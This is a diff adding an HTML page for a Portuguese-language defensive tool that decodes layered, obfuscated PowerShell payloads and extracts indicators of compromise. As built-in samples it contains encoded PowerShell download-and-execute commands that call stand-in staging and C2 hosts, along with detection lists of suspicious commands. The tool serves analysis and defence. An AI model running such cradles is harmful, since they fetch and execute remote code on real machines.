@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="overflow-x-hidden w-full max-w-full">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Decodificador Automático de Payloads (Deobfuscator)</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            cyber: { bg: '#0f172a', accent: '#22d3ee' }
+          }
+        }
+      }
+    };
+  </script>
+  <style>
+    :root {
+      --cyber-bg: #0f172a;
+      --cyber-accent: #22d3ee;
+    }
+    body {
+      background-color: var(--cyber-bg);
+    }
+    .hl-ip {
+      color: #f87171;
+      font-weight: 600;
+    }
+    .hl-url {
+      color: #22d3ee;
+      text-decoration: underline;
+    }
+    .hl-ps {
+      color: #facc15;
+      font-weight: 600;
+    }
+    details > summary {
+      list-style: none;
+    }
+    details > summary::-webkit-details-marker {
+      display: none;
+    }
+  </style>
+</head>
+<body class="min-h-screen overflow-x-hidden w-full max-w-full text-slate-200">
+  <!-- Constantes globais: ajuste keywords, profundidade e listas aqui -->
+  <script>
+    const SCORE_KEYWORDS = [
+      'IEX',
+      'Invoke-',
+      'New-Object',
+      'WebClient',
+      'DownloadString',
+      '-EncodedCommand',
+      'Start-Process',
+      'cmd.exe',
+      'powershell.exe',
+      'http',
+      'https',
+      '127.0.0.1'
+    ];
+    const MAX_DECODE_LAYERS = 8;
+    const PRINTABLE_RATIO_WEIGHT = 50;
+    const READABLE_PRINTABLE_THRESHOLD = 0.55;
+    const MIN_HEX_LENGTH = 8;
+    const SUSPICIOUS_PS_COMMANDS = [
+      'Invoke-Expression',
+      'IEX',
+      'Invoke-WebRequest',
+      'IWR',
+      'Invoke-RestMethod',
+      'DownloadString',
+      'DownloadFile',
+      'Net.WebClient',
+      'WebClient',
+      'Add-Type',
+      'Reflection.Assembly',
+      'VirtualAlloc',
+      'CreateRemoteThread',
+      'FromBase64String',
+      'EncodedCommand',
+      'Bypass',
+      '-nop',
+      '-w hidden',
+      'Start-Process',
+      'bitsadmin',
+      'certutil',
+      'regsvr32',
+      'mshta',
+      'rundll32',
+      'schtasks',
+      'wmic',
+      'Get-ItemProperty',
+      'Set-MpPreference'
+    ];
+
+    /** IOCs: prefixos de namespaces .NET (lista exata para filtragem). */
+    const DOTNET_NAMESPACE_PREFIXES = [
+      'system.',
+      'microsoft.',
+      'newtonsoft.',
+      'system.management.automation.',
+      'system.security.',
+      'system.net.',
+      'system.io.',
+      'system.text.',
+      'system.runtime.',
+      'system.diagnostics.',
+      'system.threading.',
+      'system.collections.'
+    ];
+
+    /** TLDs comuns: se o último rótulo bater aqui, tratamos como rede (não tipo .NET). */
+    const COMMON_TLDS = new Set([
+      'com', 'net', 'org', 'io', 'co', 'uk', 'br', 'edu', 'gov', 'mil', 'info', 'biz', 'tv', 'me', 'cc',
+      'xyz', 'ru', 'cn', 'de', 'fr', 'au', 'jp', 'nl', 'eu', 'int', 'arpa', 'local', 'app', 'dev',
+      'cloud', 'tech', 'site', 'online', 'store', 'blog', 'ai', 'go', 'us', 'ca', 'in', 'mx', 'pt',
+      'example', 'test', 'invalid', 'localhost', 'internal', 'corp', 'lan', 'home', 'arpa'
+    ]);
+
+    /** Host a partir de URL (para Domínio = apenas rede). */
+    function extractHostnameFromUrl(urlString) {
+      try {
+        const u = new URL(urlString);
+        if (u.hostname) return u.hostname;
+      } catch (_) {}
+      const m = urlString.match(/^https?:\/\/([^/?#\s]+)/i);
+      return m ? m[1].replace(/:\d+$/, '') : '';
+    }
+
+    /**
+     * Identifica namespaces/classes .NET (ex.: System.IO.Compression.DeflateStream, IO.StreamReader).
+     * Não confundir com FQDN: system.io como site usa heurística de TLD e número de rótulos.
+     */
+    function looksLikeDotNetNamespaceOrClass(value) {
+      const s = value.trim();
+      if (!s.includes('.') || s.includes('://') || s.includes('/') || s.includes('@')) return false;
+      const parts = s.split('.');
+      if (parts.length < 2) return false;
+      const lower0 = parts[0].toLowerCase();
+      const lastLower = parts[parts.length - 1].toLowerCase();
+
+      /* system.com / microsoft.com / windows.com → rede, não biblioteca */
+      if (
+        parts.length === 2 &&
+        (lower0 === 'system' || lower0 === 'microsoft' || lower0 === 'windows') &&
+        COMMON_TLDS.has(lastLower)
+      ) {
+        return false;
+      }
+
+      for (const p of DOTNET_NAMESPACE_PREFIXES) {
+        if (s.toLowerCase().startsWith(p)) return true;
+      }
+
+      const rootsMulti = new Set([
+        'system',
+        'microsoft',
+        'windows',
+        'management',
+        'reflection',
+        'diagnostics',
+        'collections',
+        'runtime',
+        'threading',
+        'security',
+        'globalization',
+        'servicemodel',
+        'configuration',
+        'componentmodel',
+        'activities',
+        'workflow',
+        'presentation',
+        'drawing',
+        'forms',
+        'serialization'
+      ]);
+      if (rootsMulti.has(lower0) && parts.length >= 3) return true;
+      if (rootsMulti.has(lower0) && parts.length === 2 && !COMMON_TLDS.has(lastLower)) return true;
+
+      /* IO.StreamReader, Net.WebClient (raiz curta + tipo PascalCase) */
+      if (/^(IO|UI|Xml|Linq|Data|Net|Text|Threading)\.[A-Z]/.test(s)) return true;
+
+      /* Cadeia só PascalCase e último segmento não é TLD → tipo .NET (ex.: System.Text.Encoding) */
+      const allPascal = parts.every((seg) => /^[A-Z][A-Za-z0-9_]*$/.test(seg));
+      if (allPascal && parts.length >= 2 && !COMMON_TLDS.has(lastLower)) return true;
+
+      return false;
+    }
+
+    /**
+     * Forma de hostname/FQDN (sem excluir .NET): rótulos + TLD + profundidade.
+     * Profundidade: pelo menos dois pontos (≥3 rótulos) OU apex com TLD conhecido (subnível + TLD, típico em C2).
+     */
+    function networkFqdnStructure(value) {
+      const s = value.trim();
+      if (s.includes('://') || s.includes('/') || s.includes('@')) return false;
+      const parts = s.split('.');
+      if (parts.length < 2) return false;
+      const labelOk = (lab) => /^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$/i.test(lab);
+      if (!parts.every(labelOk)) return false;
+      const last = parts[parts.length - 1].toLowerCase();
+      if (!/^[a-z]{2,24}$/.test(last)) return false;
+      const hasAtLeastTwoDots = parts.length >= 3;
+      const apexWithKnownTld = parts.length === 2 && COMMON_TLDS.has(last);
+      if (!(hasAtLeastTwoDots || apexWithKnownTld)) return false;
+      if (COMMON_TLDS.has(last)) return true;
+      if (last.length >= 2 && last.length <= 6) return true;
+      return false;
+    }
+
+    /** FQDN de rede: estrutura válida e não classificado como namespace/tipo .NET. */
+    function looksLikeNetworkFqdn(value) {
+      if (looksLikeDotNetNamespaceOrClass(value)) return false;
+      return networkFqdnStructure(value);
+    }
+
+    /* Amostra 1: Base64 simples (UTF-8) com cadeia PowerShell + URL */
+    const PAYLOAD_SAMPLE_1 = (() => {
+      const s =
+        'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.50.10/stage.ps1\')"';
+      return btoa(unescape(encodeURIComponent(s)));
+    })();
+
+    /* Amostra 2: Base64 externo sobre Base64 interno; interno = UTF-16LE + IP C2 */
+    const PAYLOAD_SAMPLE_2 = (() => {
+      const inner = '$c2="http://10.20.30.40:8080/beacon"; IEX (iwr -UseBasicParsing $c2).Content';
+      const buf = new Uint8Array(inner.length * 2);
+      for (let i = 0; i < inner.length; i++) {
+        const code = inner.charCodeAt(i);
+        buf[i * 2] = code & 0xff;
+        buf[i * 2 + 1] = (code >> 8) & 0xff;
+      }
+      const innerB64 = btoa(String.fromCharCode.apply(null, buf));
+      return btoa(innerB64);
+    })();
+
+    /* Amostra 3: hex de string URL-encoded (segunda camada: URL decode) */
+    const PAYLOAD_SAMPLE_3 = (() => {
+      const raw = 'https%3A%2F%2Fevil-cdn.example%2Fpayload%3Fid%3Dabc';
+      return Array.from(unescape(encodeURIComponent(raw)))
+        .map((c) => c.charCodeAt(0).toString(16).padStart(2, '0'))
+        .join('');
+    })();
+  </script>
+
+  <div class="flex min-h-screen w-full max-w-full min-w-0 flex-col lg:flex-row">
+    <aside
+      class="w-full max-w-full min-w-0 shrink-0 border-b border-cyan-500/20 bg-slate-900/80 p-6 lg:w-72 lg:max-w-full lg:border-b-0 lg:border-r"
+    >
+      <div class="mb-6 flex w-full max-w-full min-w-0 items-center gap-2">
+        <span class="h-3 w-3 rounded-full bg-cyan-400 shadow-[0_0_12px_#22d3ee]"></span>
+        <h2 class="text-sm font-semibold uppercase tracking-wider text-cyan-400">Ferramenta</h2>
+      </div>
+      <ul class="w-full max-w-full min-w-0 space-y-3 text-sm text-slate-400">
+        <li class="flex gap-2"><span class="text-cyan-400">▸</span> Detecção: URL, Hex, Base64 (todas testadas por camada)</li>
+        <li class="flex gap-2"><span class="text-cyan-400">▸</span> Base64: UTF-8, UTF-16LE, GZIP após bytes 1F 8B</li>
+        <li class="flex gap-2"><span class="text-cyan-400">▸</span> Pontuação: keywords + percentual ASCII imprimível</li>
+        <li class="flex gap-2"><span class="text-cyan-400">▸</span> Recursivo até MAX_DECODE_LAYERS</li>
+        <li class="flex gap-2"><span class="text-cyan-400">▸</span> IOCs por regex + exportação</li>
+      </ul>
+      <p class="mt-8 w-full max-w-full min-w-0 text-xs leading-relaxed text-slate-500">
+        Uso defensivo em ambiente controlado. Não execute código desconhecido.
+      </p>
+    </aside>
+
+    <div class="flex w-full max-w-full min-w-0 flex-1 flex-col">
+      <header class="w-full max-w-full min-w-0 border-b border-cyan-500/20 bg-slate-900/60 px-4 py-4 sm:px-8">
+        <h1 class="w-full max-w-full min-w-0 break-words text-xl font-bold text-cyan-400 sm:text-2xl">Decodificador Automático de Payloads</h1>
+        <p class="mt-1 w-full max-w-full min-w-0 break-words text-sm text-slate-400">PowerShell • Base64 • Hex • URL • Recursivo</p>
+      </header>
+
+      <main class="w-full max-w-full min-w-0 flex-1 space-y-6 p-4 sm:p-8">
+        <label class="block w-full max-w-full min-w-0">
+          <textarea
+            id="inputPayload"
+            rows="8"
+            class="box-border w-full max-w-full min-w-0 resize-y rounded-lg border border-cyan-500/30 bg-slate-900/80 p-4 font-mono text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-1 focus:ring-cyan-400"
+            placeholder="Cole aqui o payload ofuscado do PowerShell..."
+          ></textarea>
+        </label>
+
+        <div class="flex w-full max-w-full min-w-0 flex-wrap gap-3">
+          <button
+            type="button"
+            id="btnDecode"
+            class="min-w-0 flex-1 rounded-lg bg-cyan-500 px-6 py-4 text-base font-bold text-slate-900 shadow-lg shadow-cyan-500/25 transition hover:bg-cyan-400 sm:flex-none sm:min-w-[200px]"
+          >
+            🔍 Decodificar Automaticamente
+          </button>
+          <button
+            type="button"
+            id="btnClear"
+            class="rounded-lg border border-cyan-500/40 bg-slate-800 px-6 py-4 text-base font-medium text-cyan-300 transition hover:bg-slate-700"
+          >
+            Limpar
+          </button>
+        </div>
+
+        <div class="flex w-full max-w-full min-w-0 flex-wrap gap-2">
+          <button
+            type="button"
+            data-sample="1"
+            class="rounded-md border border-slate-600 bg-slate-800/80 px-4 py-2 text-sm text-slate-300 hover:border-cyan-500/50 hover:text-cyan-300"
+          >
+            Base64 simples
+          </button>
+          <button
+            type="button"
+            data-sample="2"
+            class="rounded-md border border-slate-600 bg-slate-800/80 px-4 py-2 text-sm text-slate-300 hover:border-cyan-500/50 hover:text-cyan-300"
+          >
+            Base64 duplo + UTF-16LE
+          </button>
+          <button
+            type="button"
+            data-sample="3"
+            class="rounded-md border border-slate-600 bg-slate-800/80 px-4 py-2 text-sm text-slate-300 hover:border-cyan-500/50 hover:text-cyan-300"
+          >
+            Hex + URL
+          </button>
+        </div>
+
+        <section id="results" class="hidden w-full max-w-full min-w-0 space-y-8 border-t border-cyan-500/20 pt-8">
+          <div class="w-full max-w-full min-w-0">
+            <h2 class="mb-4 w-full max-w-full min-w-0 break-words text-lg font-semibold text-cyan-400">Camadas de Decodificação</h2>
+            <div id="layersContainer" class="w-full max-w-full min-w-0 space-y-3"></div>
+          </div>
+
+          <div class="w-full max-w-full min-w-0">
+            <h2 class="mb-4 w-full max-w-full min-w-0 break-words text-lg font-semibold text-cyan-400">Texto Final Decodificado</h2>
+            <pre class="w-full max-w-full min-w-0 overflow-x-hidden overflow-y-auto whitespace-pre-wrap break-all rounded-lg border border-cyan-500/20 bg-slate-950 p-4 text-sm"><code id="finalHighlighted" class="block w-full max-w-full min-w-0 break-all"></code></pre>
+          </div>
+
+          <div class="w-full max-w-full min-w-0">
+            <h2 class="mb-4 w-full max-w-full min-w-0 break-words text-lg font-semibold text-cyan-400">IOCs Extraídos</h2>
+            <div class="w-full max-w-full min-w-0 overflow-x-hidden rounded-lg border border-cyan-500/20">
+              <table class="w-full max-w-full min-w-0 table-fixed text-left text-sm">
+                <thead class="bg-slate-800 text-slate-300">
+                  <tr>
+                    <th class="w-[14%] max-w-full min-w-0 break-words px-4 py-3 font-medium">Tipo</th>
+                    <th class="max-w-full min-w-0 break-words px-4 py-3 font-medium">Valor</th>
+                    <th class="w-[18%] max-w-full min-w-0 break-words px-4 py-3 font-medium">Confiança</th>
+                    <th class="w-[12%] max-w-full min-w-0 break-words px-4 py-3 font-medium">Copiar</th>
+                  </tr>
+                </thead>
+                <tbody id="iocTableBody" class="w-full max-w-full min-w-0 divide-y divide-slate-700 bg-slate-900/60"></tbody>
+              </table>
+            </div>
+          </div>
+
+          <div class="flex w-full max-w-full min-w-0 flex-wrap gap-3">
+            <button
+              type="button"
+              id="btnCopyFinal"
+              class="rounded-lg bg-cyan-600 px-4 py-2 text-sm font-medium text-slate-900 hover:bg-cyan-500"
+            >
+              Copiar texto final
+            </button>
+            <button
+              type="button"
+              id="btnCopyIocs"
+              class="rounded-lg border border-cyan-500/40 bg-slate-800 px-4 py-2 text-sm text-cyan-300 hover:bg-slate-700"
+            >
+              Copiar todos IOCs
+            </button>
+            <button
+              type="button"
+              id="btnDownloadTxt"
+              class="rounded-lg border border-cyan-500/40 bg-slate-800 px-4 py-2 text-sm text-cyan-300 hover:bg-slate-700"
+            >
+              Baixar .txt
+            </button>
+          </div>
+        </section>
+      </main>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      'use strict';
+
+      const $ = (id) => document.getElementById(id);
+      const inputEl = $('inputPayload');
+      const resultsEl = $('results');
+      const layersContainer = $('layersContainer');
+      const finalHighlighted = $('finalHighlighted');
+      const iocTableBody = $('iocTableBody');
+      let lastFinalText = '';
+      let lastIocs = [];
+
+      /** Conta ocorrências literais das keywords de pontuação (lista SCORE_KEYWORDS). */
+      function keywordScore(str) {
+        let n = 0;
+        for (const kw of SCORE_KEYWORDS) {
+          let idx = 0;
+          while (true) {
+            const i = str.indexOf(kw, idx);
+            if (i === -1) break;
+            n++;
+            idx = i + kw.length;
+          }
+        }
+        return n;
+      }
+
+      /** Fração de caracteres ASCII imprimíveis (inclui tab/LF/CR). */
+      function printableRatio(str) {
+        if (!str.length) return 0;
+        let printable = 0;
+        for (let i = 0; i < str.length; i++) {
+          const c = str.charCodeAt(i);
+          if (c === 9 || c === 10 || c === 13 || (c >= 32 && c <= 126)) printable++;
+        }
+        return printable / str.length;
+      }
+
+      /** Pontuação total usada para escolher a melhor decodificação na camada. */
+      function scoreText(str) {
+        return keywordScore(str) + printableRatio(str) * PRINTABLE_RATIO_WEIGHT;
+      }
+
+      function isReadableUtf8(str) {
+        return printableRatio(str) >= READABLE_PRINTABLE_THRESHOLD;
+      }
+
+      function hasUrlEncoding(s) {
+        return /%[0-9A-Fa-f]{2}/.test(s);
+      }
+
+      /** Hex “puro”: só 0-9A-F, comprimento par após remover espaços. */
+      function looksLikeHex(s) {
+        const t = s.replace(/\s+/g, '');
+        if (t.length < MIN_HEX_LENGTH || t.length % 2 !== 0) return false;
+        return /^[0-9a-fA-F]+$/.test(t);
+      }
+
+      function normalizeBase64String(s) {
+        let t = s.replace(/\s+/g, '').replace(/-/g, '+').replace(/_/g, '/');
+        const pad = t.length % 4;
+        if (pad) t += '='.repeat(4 - pad);
+        return t;
+      }
+
+      function looksLikeBase64(s) {
+        const t = normalizeBase64String(s);
+        if (t.length < 8 || t.length % 4 !== 0) return false;
+        return /^[A-Za-z0-9+/]+=*$/.test(t);
+      }
+
+      function canApplyMoreEncoding(s) {
+        return hasUrlEncoding(s) || looksLikeHex(s) || looksLikeBase64(s);
+      }
+
+      function tryUrlDecode(s) {
+        if (!hasUrlEncoding(s)) return null;
+        try {
+          const dec = decodeURIComponent(s.replace(/\+/g, '%20'));
+          return dec !== s ? dec : null;
+        } catch {
+          return null;
+        }
+      }
+
+      function tryHexDecode(s) {
+        if (!looksLikeHex(s)) return null;
+        const t = s.replace(/\s+/g, '');
+        try {
+          const bytes = new Uint8Array(t.length / 2);
+          for (let i = 0; i < bytes.length; i++) {
+            bytes[i] = parseInt(t.substring(i * 2, i * 2 + 2), 16);
+          }
+          const dec = new TextDecoder('utf-8', { fatal: false }).decode(bytes);
+          return dec.length ? dec : null;
+        } catch {
+          return null;
+        }
+      }
+
+      function bytesFromBinaryString(bin) {
+        const out = new Uint8Array(bin.length);
+        for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i) & 0xff;
+        return out;
+      }
+
+      /** Detecta GZIP (magic 1F 8B) e descomprime via DecompressionStream nativo. */
+      async function gunzipBytes(bytes) {
+        if (bytes.length < 3 || bytes[0] !== 0x1f || bytes[1] !== 0x8b) return null;
+        if (typeof DecompressionStream === 'undefined') return null;
+        try {
+          const stream = new Blob([bytes]).stream().pipeThrough(new DecompressionStream('gzip'));
+          return new Uint8Array(await new Response(stream).arrayBuffer());
+        } catch {
+          return null;
+        }
+      }
+
+      /**
+       * Candidatos Base64: UTF-8 e UTF-16LE nos bytes decodificados;
+       * se GZIP, aplica os mesmos decoders no payload inflado.
+       * Regra PS: UTF-8 primeiro; se “ilegível”, remove UTF-8 fraco se UTF-16LE pontua igual ou melhor.
+       */
+      async function base64Candidates(s) {
+        if (!looksLikeBase64(s)) return [];
+        let bin;
+        try {
+          bin = atob(normalizeBase64String(s));
+        } catch {
+          return [];
+        }
+        const bytes = bytesFromBinaryString(bin);
+        const out = [];
+        out.push({ type: 'Base64 -> UTF-8', text: new TextDecoder('utf-8', { fatal: false }).decode(bytes) });
+        out.push({ type: 'Base64 -> UTF-16LE', text: new TextDecoder('utf-16le', { fatal: false }).decode(bytes) });
+        const gz = await gunzipBytes(bytes);
+        if (gz) {
+          out.push({ type: 'Base64 -> GZIP -> UTF-8', text: new TextDecoder('utf-8', { fatal: false }).decode(gz) });
+          out.push({
+            type: 'Base64 -> GZIP -> UTF-16LE',
+            text: new TextDecoder('utf-16le', { fatal: false }).decode(gz)
+          });
+        }
+        const filtered = [];
+        for (const c of out) {
+          if (c.type === 'Base64 -> UTF-8' && !isReadableUtf8(c.text)) {
+            const le = out.find((x) => x.type === 'Base64 -> UTF-16LE');
+            if (le && scoreText(le.text) >= scoreText(c.text)) continue;
+          }
+          filtered.push(c);
+        }
+        return filtered;
+      }
+
+      /** Desempate: prioridade URL > Hex > Base64 quando a pontuação empata. */
+      function typeRank(type) {
+        if (type === 'URL decode') return 3;
+        if (type === 'Hex -> texto') return 2;
+        return 1;
+      }
+
+      function betterCandidate(a, b) {
+        if (b.score !== a.score) return b.score - a.score;
+        return typeRank(b.type) - typeRank(a.type);
+      }
+
+      /** Avalia todas as transformações aplicáveis e escolhe a de maior pontuação. */
+      async function pickBestStep(current) {
+        const list = [];
+        const u = tryUrlDecode(current);
+        if (u != null) list.push({ type: 'URL decode', text: u, score: scoreText(u) });
+        const h = tryHexDecode(current);
+        if (h != null) list.push({ type: 'Hex -> texto', text: h, score: scoreText(h) });
+        for (const b of await base64Candidates(current)) {
+          list.push({ type: b.type, text: b.text, score: scoreText(b.text) });
+        }
+        if (!list.length) return null;
+        list.sort((a, b) => betterCandidate(a, b));
+        return list[0];
+      }
+
+      /**
+       * Loop recursivo: aplica a melhor camada enquanto a pontuação sobe
+       * ou ainda existe nova codificação (URL/hex/base64) no texto resultante.
+       */
+      async function recursiveDecode(initial) {
+        const layers = [{ type: 'Entrada bruta', text: initial }];
+        let current = initial;
+        let prevScore = scoreText(current);
+        for (let d = 0; d < MAX_DECODE_LAYERS; d++) {
+          const step = await pickBestStep(current);
+          if (!step || step.text === current) break;
+          const newScore = scoreText(step.text);
+          const stillEncoded = canApplyMoreEncoding(step.text);
+          if (newScore <= prevScore && !stillEncoded) break;
+          layers.push({ type: step.type, text: step.text });
+          current = step.text;
+          prevScore = newScore;
+        }
+        return { layers, finalText: current };
+      }
+
+      function escapeHtml(s) {
+        return s
+          .replace(/&/g, '&amp;')
+          .replace(/</g, '&lt;')
+          .replace(/>/g, '&gt;')
+          .replace(/"/g, '&quot;');
+      }
+
+      function escapeRegex(t) {
+        return t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      }
+
+      /** Destaque simples: URLs ciano, IPs vermelho, comandos PS suspeitos amarelo. */
+      function highlightFinal(text) {
+        let s = escapeHtml(text);
+        s = s.replace(/\bhttps?:\/\/[^\s<>"']+/gi, (m) => `<span class="hl-url">${m}</span>`);
+        s = s.replace(
+          /\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g,
+          (m) => `<span class="hl-ip">${m}</span>`
+        );
+        s = s.replace(/\b(?:[0-9a-fA-F]{1,4}:){2,7}[0-9a-fA-F]{1,4}\b/g, (m) => `<span class="hl-ip">${m}</span>`);
+        for (const cmd of SUSPICIOUS_PS_COMMANDS) {
+          const re = new RegExp(escapeRegex(cmd), 'gi');
+          s = s.replace(re, (m) => `<span class="hl-ps">${m}</span>`);
+        }
+        return s;
+      }
+
+      /** Extração de IOCs: IPv4/6, URLs, domínios (só rede), bibliotecas .NET, e-mails, hashes, PS. */
+      function extractIocs(text) {
+        const rows = [];
+        const seen = new Set();
+        const add = (tipo, valor, confianca) => {
+          if (!valor || valor.length > 2000) return;
+          const k = tipo + '\0' + valor + '\0' + (confianca || '');
+          if (seen.has(k)) return;
+          seen.add(k);
+          rows.push({ tipo, valor, confianca: confianca || '' });
+        };
+        let m;
+        const ipv4 = /\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g;
+        while ((m = ipv4.exec(text)) !== null) add('IPv4', m[0]);
+        const ipv6 = /\b(?:[0-9a-fA-F]{1,4}:){2,7}[0-9a-fA-F]{1,4}\b/g;
+        while ((m = ipv6.exec(text)) !== null) add('IPv6', m[0]);
+        const urls = /\bhttps?:\/\/[^\s<>"']+/gi;
+        while ((m = urls.exec(text)) !== null) {
+          add('URL', m[0]);
+          const host = extractHostnameFromUrl(m[0]);
+          if (host && networkFqdnStructure(host)) {
+            if (looksLikeDotNetNamespaceOrClass(host)) add('Domínio', host, 'baixa (possível namespace .NET)');
+            else if (looksLikeNetworkFqdn(host)) add('Domínio', host, 'alta');
+          }
+        }
+        const dottedToken = /\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b/gi;
+        while ((m = dottedToken.exec(text)) !== null) {
+          const token = m[0];
+          if (token.includes('://')) continue;
+          if (looksLikeDotNetNamespaceOrClass(token)) {
+            add('Bibliotecas .NET', token);
+            if (networkFqdnStructure(token)) add('Domínio', token, 'baixa (possível namespace .NET)');
+          } else if (looksLikeNetworkFqdn(token)) add('Domínio', token, 'alta');
+        }
+        const emails = /\b[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}\b/gi;
+        while ((m = emails.exec(text)) !== null) add('E-mail', m[0]);
+        const md5 = /\b[a-f0-9]{32}\b/gi;
+        while ((m = md5.exec(text)) !== null) add('MD5', m[0]);
+        const sha1 = /\b[a-f0-9]{40}\b/gi;
+        while ((m = sha1.exec(text)) !== null) add('SHA1', m[0]);
+        const sha256 = /\b[a-f0-9]{64}\b/gi;
+        while ((m = sha256.exec(text)) !== null) add('SHA256', m[0]);
+        for (const cmd of SUSPICIOUS_PS_COMMANDS) {
+          const re = new RegExp(`\\b${escapeRegex(cmd)}\\b`, 'gi');
+          while ((m = re.exec(text)) !== null) add('PowerShell suspeito', m[0]);
+        }
+        return rows;
+      }
+
+      function renderLayers(layers) {
+        layersContainer.innerHTML = '';
+        layers.forEach((layer, i) => {
+          const details = document.createElement('details');
+          details.className =
+            'w-full max-w-full min-w-0 rounded-lg border border-slate-700 bg-slate-900/80 open:border-cyan-500/40';
+          details.open = i === layers.length - 1;
+          const summary = document.createElement('summary');
+          summary.className =
+            'flex w-full max-w-full min-w-0 cursor-pointer items-center justify-between gap-2 px-4 py-3 text-sm font-medium text-cyan-300 hover:bg-slate-800/80';
+          summary.innerHTML = `<span class="min-w-0 flex-1 break-words">Camada ${i + 1}: <span class="text-slate-300">${escapeHtml(
+            layer.type
+          )}</span></span><span class="shrink-0 text-slate-500">▼</span>`;
+          const div = document.createElement('div');
+          div.className = 'w-full max-w-full min-w-0 border-t border-slate-700 px-4 py-3';
+          const pre = document.createElement('pre');
+          pre.className =
+            'max-h-52 w-full max-w-full min-w-0 overflow-x-hidden overflow-y-auto whitespace-pre-wrap break-all font-mono text-xs text-slate-300';
+          pre.textContent = layer.text;
+          div.appendChild(pre);
+          details.appendChild(summary);
+          details.appendChild(div);
+          layersContainer.appendChild(details);
+        });
+      }
+
+      function renderIocs(iocs) {
+        iocTableBody.innerHTML = '';
+        iocs.forEach((ioc, idx) => {
+          const tr = document.createElement('tr');
+          tr.className = 'w-full max-w-full min-w-0 hover:bg-slate-800/50';
+          tr.innerHTML = `<td class="max-w-full min-w-0 break-words px-4 py-2 text-slate-400">${escapeHtml(ioc.tipo)}</td><td class="max-w-full min-w-0 break-all px-4 py-2 font-mono text-xs text-cyan-200">${escapeHtml(
+            ioc.valor
+          )}</td><td class="max-w-full min-w-0 break-words px-4 py-2 text-slate-400">${escapeHtml(ioc.confianca || '—')}</td><td class="max-w-full min-w-0 whitespace-nowrap px-4 py-2"><button type="button" data-ioc-idx="${idx}" class="rounded bg-cyan-600/80 px-2 py-1 text-xs text-slate-900 hover:bg-cyan-500">Copiar</button></td>`;
+          iocTableBody.appendChild(tr);
+        });
+        iocTableBody.querySelectorAll('[data-ioc-idx]').forEach((btn) => {
+          btn.addEventListener('click', () => {
+            const i = +btn.getAttribute('data-ioc-idx');
+            copyToClipboard(iocs[i].valor);
+          });
+        });
+      }
+
+      function copyToClipboard(t) {
+        if (!t) return;
+        navigator.clipboard.writeText(t).catch(() => {
+          const ta = document.createElement('textarea');
+          ta.value = t;
+          document.body.appendChild(ta);
+          ta.select();
+          document.execCommand('copy');
+          document.body.removeChild(ta);
+        });
+      }
+
+      async function runDecode() {
+        const raw = inputEl.value;
+        if (!raw.trim()) {
+          alert('Cole um payload antes de decodificar.');
+          return;
+        }
+        const { layers, finalText } = await recursiveDecode(raw);
+        lastFinalText = finalText;
+        lastIocs = extractIocs(finalText);
+        renderLayers(layers);
+        finalHighlighted.innerHTML = highlightFinal(finalText);
+        renderIocs(lastIocs);
+        resultsEl.classList.remove('hidden');
+      }
+
+      $('btnDecode').addEventListener('click', runDecode);
+      $('btnClear').addEventListener('click', () => {
+        inputEl.value = '';
+        resultsEl.classList.add('hidden');
+        layersContainer.innerHTML = '';
+        finalHighlighted.innerHTML = '';
+        iocTableBody.innerHTML = '';
+        lastFinalText = '';
+        lastIocs = [];
+      });
+
+      document.querySelectorAll('[data-sample]').forEach((btn) => {
+        btn.addEventListener('click', () => {
+          const n = btn.getAttribute('data-sample');
+          if (n === '1') inputEl.value = PAYLOAD_SAMPLE_1;
+          else if (n === '2') inputEl.value = PAYLOAD_SAMPLE_2;
+          else if (n === '3') inputEl.value = PAYLOAD_SAMPLE_3;
+        });
+      });
+
+      $('btnCopyFinal').addEventListener('click', () => copyToClipboard(lastFinalText));
+      $('btnCopyIocs').addEventListener('click', () => {
+        copyToClipboard(lastIocs.map((x) => `${x.tipo}\t${x.valor}\t${x.confianca || ''}`).join('\n'));
+      });
+      $('btnDownloadTxt').addEventListener('click', () => {
+        const parts = ['=== Texto final ===\n', lastFinalText, '\n\n=== IOCs ===\n'];
+        lastIocs.forEach((x) =>
+          parts.push(`${x.tipo}: ${x.valor}${x.confianca ? ' [' + x.confianca + ']' : ''}\n`)
+        );
+        const blob = new Blob(parts, { type: 'text/plain;charset=utf-8' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'decodificador-resultado.txt';
+        a.click();
+        URL.revokeObjectURL(a.href);
+      });
+    })();
+  </script>
+</body>
+</html>
